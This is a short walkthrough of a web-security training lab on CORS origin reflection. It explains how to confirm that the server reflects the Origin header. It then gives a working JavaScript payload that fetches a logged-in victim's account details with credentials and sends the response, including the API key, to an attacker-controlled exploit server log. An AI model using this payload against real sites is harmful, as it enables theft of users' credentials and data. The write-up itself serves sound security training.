# Lab: CORS vulnerability with basic origin reflection

Log in and notice that the user's api key is displayed on the account page. Check the proxy history to see that the /my-account request makes a request to /accountDetails to retrieve this information. Send the request to the repeater and add the header `Origin: https://example.com`. Notice that the response reflects the origin in the `Access-Control-Allow-Origin` header, indicating that there is a CORS vulnerability.

Use the following script to deliver to the victim via the exploit server, where the target website is accessed and logged on the malicious server:
```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac4b1f9b1fef40f1c0b7043100830080.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
    location='//exploit-aca41f991f5f4020c01b04e401d700fe.web-security-academy.net/log?response='+this.responseText;
    };
</script>
```

Check the access log to see the response and find the api key. Submit to complete the lab.